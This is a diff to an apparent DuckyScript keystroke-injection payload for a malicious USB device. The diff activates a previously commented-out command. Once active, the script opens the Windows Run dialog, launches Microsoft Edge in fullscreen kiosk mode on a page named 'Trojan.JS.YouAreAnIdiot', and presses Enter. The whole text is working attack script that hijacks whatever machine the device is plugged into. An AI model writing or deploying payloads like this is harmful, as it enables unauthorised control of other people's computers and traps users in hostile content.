@@ -6,4 +6,6 @@ REM
 DELAY 300
 GUI r
 DELAY 1000
-REM STRINGLN msedge.exe --kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot --edge-kiosk-type=fullscreen
+STRING msedge.exe --kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot --edge-kiosk-type=fullscreen
+DELAY 300
+ENTER
